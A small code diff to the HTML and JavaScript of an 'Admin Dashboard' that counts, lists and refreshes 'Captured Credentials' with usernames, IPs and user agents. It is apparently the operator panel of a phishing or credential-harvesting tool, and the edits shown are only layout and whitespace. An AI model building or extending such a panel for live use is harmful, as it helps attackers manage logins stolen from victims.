@@ -215,9 +215,12 @@
 <body>
     <h1>Admin Dashboard</h1>
     <div class="statistics-box">
-        <h2>Statistics</h2>
-        <p>Total Captured Credentials: {{ total }}</p>
-        <p>Unique IPs: {{ ips }}</p>
+        <div class="statistics-header">
+            <h2>Statistics</h2>
+            <p>Total Captured Credentials: {{ total }}</p>
+            <p>Unique IPs: {{ ips }}</p>
+        </div>
+        
 
         <h2>Captured Credentials</h2>
         <input type="text" id="search-input" placeholder="Search by Username, IP, or Agent">
@@ -372,7 +375,7 @@ function fetchUpdatedTable() {
         .then(response => response.json())
         .then(data => {
             const credentialsTable = document.getElementById('credentials-table');
-            const tableRows = credentialsTable.querySelectorAll('.table-row');
+            const tableRows = credentialsTable.querySelectorAll('.table-row');            
             
             // Remove existing rows (except the header row)
             tableRows.forEach(row => row.remove());
@@ -395,6 +398,7 @@ function fetchUpdatedTable() {
                 `;
                 credentialsTable.appendChild(row);
             });
+            
         })
         .catch(error => {
             console.error('Error fetching updated table:', error);
